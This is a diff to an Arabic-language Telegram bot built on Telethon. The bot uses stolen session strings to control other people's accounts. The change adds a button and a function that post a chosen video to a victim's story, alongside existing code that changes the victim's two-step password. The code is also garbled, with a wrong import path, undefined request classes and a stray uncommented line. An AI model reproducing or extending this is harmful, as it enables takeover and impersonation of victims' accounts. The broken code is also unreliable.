@@ -18,6 +18,7 @@ from telethon.tl.functions.account import UpdateProfileRequest
 
 from telethon.tl.functions.account import UpdateUsernameRequest
 from telethon.tl.functions.account import UpdatePasswordSettingsRequest
+from telethon.tl.function.account import UploadMediaRequest
 import random
 
 
@@ -203,6 +204,20 @@ async def change_two_step_password(termux_code, new_password):
         except Exception as e:
             print(e)
             return False
+
+
+async def post_video_to_story(strses, video_file_path, caption=None):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+           
+            media = InputMediaVideo(file=InputFile(video_file_path), caption=caption)
+            await X(PostStoryRequest(media))
+            return True
+        except Exception as e:
+            print(e)
+            return False
+#كوم بي
+
 #تحقق 
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -312,6 +327,7 @@ keyboard = [
      Button.inline("X", data="X"),  # إضافة زر شفاف بحرف X
      Button.inline("O", data="O"),  # إضافة زر شفاف بحرف O
      Button.inline("T", data="T"),  # إضافة زر شفاف بحرف T
+     Button.inline("M", data="M"),  # إضافة زر شفاف بحرف M
      Button.url("المطور", "https://t.me/angthon")
     ]
 ]
@@ -371,7 +387,8 @@ async def start(event):
         Button.inline("Z", data="Z"),
         Button.inline("X", data="X"),
         Button.inline("O", data="O"),
-        Button.inline("T", data="T"),   
+        Button.inline("T", data="T"),
+        Button.inline("M", data="M"),   
     ],
     [
         
@@ -928,3 +945,23 @@ async def change_two_step_password_event(event):
         await change_two_step_password(termux_code, new_password)
         await event.reply("تم تغيير كلمة المرور تحقق بخطوتين بنجاح 🚀💀", buttons=keyboard)
 #امر فقط في سورس الخفاش 🦇
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"S")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+
+        await x.send_message("انطيني الفيديو الي تريده بالستوري")
+        video_msg = await x.get_response()
+
+         contains the video file or path
+        video_path = video_msg.file.path 
+
+        await post_video_to_story(strses.text, video_path, caption="Check out this video!")
+        await event.reply(" نشرت الفيديو بنجاح 🦇🎥", buttons=keyboard)
